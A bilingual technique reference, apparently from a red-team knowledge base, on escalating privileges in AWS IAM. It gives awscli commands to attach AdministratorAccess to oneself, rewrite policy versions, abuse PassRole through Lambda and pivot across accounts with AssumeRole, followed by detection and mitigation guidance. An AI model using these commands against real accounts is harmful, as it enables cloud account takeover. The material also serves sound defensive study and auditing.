---
id: aws-iam-privilege-escalation
title_en: AWS IAM Privilege Escalation
title_zh: AWS IAM 提权
summary_en: Cloud escalation rarely needs an exploit. One over-permissive policy — AttachUserPolicy, CreatePolicyVersion, or PassRole on something that runs code — turns a leaked access key into the whole account. The map below is the one worth memorising.
summary_zh: 云上的提权很少需要漏洞。一条过宽的策略 —— AttachUserPolicy、CreatePolicyVersion，或者对某个能跑代码的服务拥有 PassRole —— 就能把一对泄漏的 Access Key 变成整个账号。下面这张映射表值得背下来。
tags: [cloud, aws, iam, privilege-escalation, red-team, bugbounty]
tools: [awscli, Pacu, enumerate-iam, cloudsplaining, ScoutSuite]
attck: [T1078.004, T1098.003]
platform: [cloud]
difficulty: advanced
updated: 2026-10-08
---

<!-- lang:en -->
### Where the keys come from

An AWS escalation usually starts with a pair of keys, and they leak in predictable places:

- SSRF into the instance metadata service (its own technique, covered separately).
- CI/CD: build logs, environment variables, an over-permissive GitHub Actions OIDC role.
- A public or misconfigured S3 bucket, or a backup archive left in one.
- Git history — a `.env` committed once and deleted later is still in the history.
- Container and serverless environment variables; EC2 user-data, which is readable by anything on the instance.
- `~/.aws/credentials` on a compromised developer laptop, which frequently holds more than the app does.

The first thing to do with a key is never to use it broadly; it is to find out precisely what it is allowed to do. Unnecessary `Describe*` calls are noisy and can trip GuardDuty before you have a plan.

### Step 1 — Identity and permissions

```bash
aws sts get-caller-identity

# what is attached, directly and via groups
aws iam list-attached-user-policies --user-name jdoe
aws iam list-user-policies --user-name jdoe
aws iam list-groups-for-user --user-name jdoe
aws iam get-policy-version --policy-arn <arn> --version-id v1
```

Then the command that actually answers the question — simulate rather than guess:

```bash
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789012:user/jdoe \
  --action-names iam:CreatePolicyVersion iam:PassRole ec2:RunInstances lambda:UpdateFunctionCode
```

When the key belongs to a role, `list-attached-role-policies` and `get-role` tell you the same. `enumerate-iam` brute-forces a large action list if you want a quick capability dump; `cloudsplaining` reads the account's policies offline and flags the dangerous ones; `Pacu` is the interactive framework for the whole workflow.

### Step 2 — The map worth memorising

| Permission you hold | Escalation |
|---|---|
| `iam:CreatePolicyVersion` | Create a new version of a policy you are attached to, with `--set-as-default` — instant admin |
| `iam:SetDefaultPolicyVersion` | Switch an existing, more permissive version to default |
| `iam:AttachUserPolicy` / `AttachGroupPolicy` / `AttachRolePolicy` | Attach `AdministratorAccess` to yourself |
| `iam:PutUserPolicy` / `PutRolePolicy` / `PutGroupPolicy` | Write an inline policy granting anything |
| `iam:CreateAccessKey` | Mint keys for another user (including one with more power) |
| `iam:CreateLoginProfile` / `iam:UpdateLoginProfile` | Give a user console access, or reset their password |
| `iam:AddUserToGroup` | Add yourself to a privileged group |
| `iam:UpdateAssumeRolePolicy` | Change a role's trust policy so you can assume it |
| `sts:AssumeRole` | Jump to any role whose trust policy allows you — often the step into another account |
| `iam:PassRole` + `ec2:RunInstances` | Launch an instance with a more privileged role attached, then read its credentials |
| `iam:PassRole` + `lambda:CreateFunction` / `UpdateFunctionCode` | Run your code as that role |
| `lambda:GetFunction` | Environment variables of an existing function, which often hold keys |
| `ssm:SendCommand` | Run commands on instances that have the SSM agent — no SSH needed |
| `ssm:GetParameter` / `secretsmanager:GetSecretValue` | More credentials, including database and third-party ones |
| `ec2:DescribeInstances` + `ec2:GetConsoleOutput` | User-data from the console output, which sometimes holds bootstrap secrets |
| `s3:GetObject` across buckets | Config files, backups, `.env` files, Terraform state (which contains secrets in clear text) |

A typical three-step chain looks like this:

```bash
# 1. we can attach policies to ourselves
aws iam attach-user-policy --user-name jdoe \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 2. or we can rewrite a policy we are already attached to
aws iam create-policy-version --policy-arn <our-policy-arn> \
  --policy-document file://admin.json --set-as-default

# 3. confirm
aws sts get-caller-identity
aws iam list-users
```

### Step 3 — PassRole, the permission people forget to restrict

`iam:PassRole` on its own does nothing. Combined with a service that runs code, it is full compromise of whatever role you can pass:

```bash
# run our code as a role that can read every bucket
aws lambda create-function --function-name audit \
  --runtime python3.12 --role arn:aws:iam::123456789012:role/HighPrivRole \
  --handler lambda_function.handler --zip-file fileb://payload.zip

# or modify a function that already has that role
aws lambda update-function-code --function-name existing \
  --zip-file fileb://payload.zip
```

The same idea with EC2 (`RunInstances` with an instance profile, then read the metadata from inside), with ECS tasks, with Glue jobs, and with CloudFormation stacks. If you can pass a role and create a resource that executes something, you have that role's permissions.

### Step 4 — Across accounts

Once you have credentials, `sts:AssumeRole` is the pivot. Enumerate what you can reach:

```bash
aws sts assume-role --role-arn arn:aws:iam::999999999999:role/Deploy \
  --role-session-name audit
```

Common misconfigurations: a trust policy with `"Principal": {"AWS": "*"}` plus a condition that does not actually restrict anything; a role trusting an entire account where any user can assume it; a CI role trusting a repository that outsiders can fork; `ExternalId` values that are guessable or committed in code.

### Detection

CloudTrail is the whole game here, and these events deserve alerts on their own:

| Event | Why it matters |
|---|---|
| `CreatePolicyVersion` with `setAsDefault` | The quietest way to grant yourself anything |
| `AttachUserPolicy` / `PutUserPolicy` / `PutRolePolicy` | Direct privilege grant |
| `CreateAccessKey` for a user that is not you | Persistence and a second identity |
| `CreateLoginProfile` / `UpdateLoginProfile` | Console access where there was none |
| `UpdateAssumeRolePolicy` | Trust policy rewritten to allow a new principal |
| `RunInstances` with an instance profile you do not normally use | Role abuse through compute |
| `lambda:CreateFunction` / `UpdateFunctionCode` with a privileged role | Code execution as that role |
| `GetSecretValue` spikes | Credential harvesting |
| `AssumeRole` from an unusual IP, user agent, or geography | The pivot itself |

GuardDuty covers several of these out of the box (`CredentialAccess:IAMUser/*`, `Persistence:IAMUser/*`, `UnauthorizedAccess:IAMUser/*`). The user agent is a useful signal: `aws-cli` from an unexpected ASN, or Pacu's default strings, are easy wins.

### Mitigation

- **No long-lived access keys.** Use IAM roles, instance profiles, and OIDC federation for CI. Long-lived keys are the reason a leak becomes a breach.
- **Permissions boundaries** on every role you hand out, limiting the maximum privilege that role can ever grant — this specifically neutralises `CreatePolicyVersion`, `AttachUserPolicy` and friends.
- **SCPs** at the organisation level to deny the escalation primitives (`iam:CreatePolicyVersion`, `iam:UpdateAssumeRolePolicy`, `iam:PassRole` outside a narrow list) regardless of what a local policy says.
- **Restrict `iam:PassRole` with conditions** (`iam:PassedToService`) so a role can only be handed to the service it was meant for.
- **Require MFA for sensitive actions** with the `aws:MultiFactorAuthPresent` condition — a stolen key then cannot attach policies or create users.
- **IAM Access Analyzer** and last-accessed data to find and delete permissions nobody uses; most escalation paths are unused permissions that were granted "just in case".
- **CloudTrail in every region**, with an immutable destination, plus GuardDuty and alerting on the events above.
- **Separate accounts per environment** so a foothold in the sandbox is not a foothold in production.

<!-- lang:zh -->
### 密钥是从哪来的

AWS 提权通常从一对密钥开始，而它们泄漏的地方是高度可预测的：

- SSRF 打实例元数据服务（这是独立的一种技术，另有专篇）。
- CI/CD：构建日志、环境变量、权限过宽的 GitHub Actions OIDC 角色。
- 公开或配置错误的 S3 桶，或者被丢在里面的备份包。
- Git 历史 —— 提交过一次再删掉的 `.env`，仍然留在历史里。
- 容器与 Serverless 的环境变量；EC2 的 user-data，实例上任何东西都能读。
- 被拿下的开发者笔记本上的 `~/.aws/credentials`，里面的权限往往比应用本身更大。

拿到密钥后的第一件事绝不是到处乱用，而是精确查清它被允许做什么。多余的 `Describe*` 调用既吵闹，又可能在你还没想好计划之前就触发 GuardDuty。

### 第一步 —— 身份与权限

```bash
aws sts get-caller-identity

# 直接附加的策略，以及通过组附加的
aws iam list-attached-user-policies --user-name jdoe
aws iam list-user-policies --user-name jdoe
aws iam list-groups-for-user --user-name jdoe
aws iam get-policy-version --policy-arn <arn> --version-id v1
```

然后是真正回答问题的命令 —— 用模拟，而不是猜：

```bash
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789012:user/jdoe \
  --action-names iam:CreatePolicyVersion iam:PassRole ec2:RunInstances lambda:UpdateFunctionCode
```

当密钥属于某个角色时，`list-attached-role-policies` 和 `get-role` 告诉你同样的信息。想要快速摸清能力范围，可以用 `enumerate-iam` 暴力试一大批 action；`cloudsplaining` 离线读取账号策略并标出危险的；`Pacu` 是整个工作流的交互式框架。

### 第二步 —— 值得背下来的映射

| 你持有的权限 | 提权方式 |
|---|---|
| `iam:CreatePolicyVersion` | 给你所附加的策略建一个新版本，带 `--set-as-default` —— 瞬间管理员 |
| `iam:SetDefaultPolicyVersion` | 把某个更宽松的旧版本切成默认 |
| `iam:AttachUserPolicy` / `AttachGroupPolicy` / `AttachRolePolicy` | 把 `AdministratorAccess` 挂到自己身上 |
| `iam:PutUserPolicy` / `PutRolePolicy` / `PutGroupPolicy` | 写一条内联策略，想给什么给什么 |
| `iam:CreateAccessKey` | 给别的用户（包括权限更高的）签发密钥 |
| `iam:CreateLoginProfile` / `iam:UpdateLoginProfile` | 给用户开控制台访问，或重设他的口令 |
| `iam:AddUserToGroup` | 把自己加进特权组 |
| `iam:UpdateAssumeRolePolicy` | 改角色的信任策略，让自己能 assume 它 |
| `sts:AssumeRole` | 跳到任何信任策略允许你的角色 —— 常常是跨账号的那一步 |
| `iam:PassRole` + `ec2:RunInstances` | 起一台带更高权限角色的实例，然后读它的凭据 |
| `iam:PassRole` + `lambda:CreateFunction` / `UpdateFunctionCode` | 以那个角色的身份跑你的代码 |
| `lambda:GetFunction` | 现有函数的环境变量，里面常有密钥 |
| `ssm:SendCommand` | 在装了 SSM agent 的实例上执行命令 —— 不需要 SSH |
| `ssm:GetParameter` / `secretsmanager:GetSecretValue` | 更多凭据，包括数据库和三方系统的 |
| `ec2:DescribeInstances` + `ec2:GetConsoleOutput` | 从控制台输出里拿 user-data，其中有时含引导阶段的机密 |
| 跨桶的 `s3:GetObject` | 配置文件、备份、`.env`、Terraform state（里面常常是明文密钥） |

一条典型的三步链长这样：

```bash
# 1. 我们能给自己挂策略
aws iam attach-user-policy --user-name jdoe \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 2. 或者改写一条我们已经附加的策略
aws iam create-policy-version --policy-arn <our-policy-arn> \
  --policy-document file://admin.json --set-as-default

# 3. 确认
aws sts get-caller-identity
aws iam list-users
```

### 第三步 —— PassRole，最常被忘记限制的那一个

`iam:PassRole` 单独看什么都不是。一旦配上能跑代码的服务，就等于完全接管你能传过去的那个角色：

```bash
# 用那个能读所有桶的角色跑我们的代码
aws lambda create-function --function-name audit \
  --runtime python3.12 --role arn:aws:iam::123456789012:role/HighPrivRole \
  --handler lambda_function.handler --zip-file fileb://payload.zip

# 或者直接改一个已经有该角色的函数
aws lambda update-function-code --function-name existing \
  --zip-file fileb://payload.zip
```

同样的思路适用于 EC2（用实例配置文件 `RunInstances`，再从实例内部读元数据）、ECS 任务、Glue 作业、CloudFormation 栈。**只要你能传一个角色并创建能执行东西的资源，你就拥有了那个角色的权限。**

### 第四步 —— 跨账号

拿到凭据之后，`sts:AssumeRole` 就是跳板。先枚举能到哪：

```bash
aws sts assume-role --role-arn arn:aws:iam::999999999999:role/Deploy \
  --role-session-name audit
```

常见配置错误：信任策略写了 `"Principal": {"AWS": "*"}` 而条件实际上什么都没限制；角色信任整个账号，于是任何用户都能 assume；CI 角色信任了一个外部可以 fork 的仓库；`ExternalId` 可猜，或者干脆提交在代码里。

### 检测

这里 CloudTrail 就是全部，下面这些事件每一条都值得单独告警：

| 事件 | 为什么重要 |
|---|---|
| 带 `setAsDefault` 的 `CreatePolicyVersion` | 给自己授权最安静的一种方式 |
| `AttachUserPolicy` / `PutUserPolicy` / `PutRolePolicy` | 直接授予权限 |
| 给非自己的用户 `CreateAccessKey` | 持久化 + 第二个身份 |
| `CreateLoginProfile` / `UpdateLoginProfile` | 原本没有的控制台访问被打开 |
| `UpdateAssumeRolePolicy` | 信任策略被改写，允许了新主体 |
| 用平时不用的实例配置文件 `RunInstances` | 通过计算资源滥用角色 |
| 用高权角色 `lambda:CreateFunction` / `UpdateFunctionCode` | 以该角色执行代码 |
| `GetSecretValue` 突增 | 凭据收割 |
| 来自异常 IP、user-agent 或地域的 `AssumeRole` | 跳板本身 |

GuardDuty 开箱就覆盖了其中几类（`CredentialAccess:IAMUser/*`、`Persistence:IAMUser/*`、`UnauthorizedAccess:IAMUser/*`）。user-agent 也是有用的信号：来自意外 ASN 的 `aws-cli`，或者 Pacu 的默认字符串，都是很容易抓到的。

### 缓解

- **不要用长期 Access Key。** 用 IAM 角色、实例配置文件、CI 上的 OIDC 联邦。长期密钥正是"一次泄漏变成一次入侵"的原因。
- **给每个分发出去的角色都加 Permissions Boundary**，限制它最多能授出多少权限 —— 这一条专门克制 `CreatePolicyVersion`、`AttachUserPolicy` 这类手法。
- **组织级 SCP** 直接拒绝这些提权原语（`iam:CreatePolicyVersion`、`iam:UpdateAssumeRolePolicy`、白名单之外的 `iam:PassRole`），无论本地策略怎么写。
- **用条件限制 `iam:PassRole`**（`iam:PassedToService`），让一个角色只能交给它本该服务的那个服务。
- **敏感操作要求 MFA**（`aws:MultiFactorAuthPresent` 条件）—— 被偷的密钥就无法挂策略或建用户了。
- **IAM Access Analyzer** 与 last-accessed 数据，找出并删掉没人用的权限；大多数提权路径都是"以防万一"授出去、之后从未使用的权限。
- **每个区域都开 CloudTrail**，写入不可篡改的存储，再配 GuardDuty 和对上述事件的告警。
- **按环境分账号**，让沙箱里的落脚点不等于生产里的落脚点。
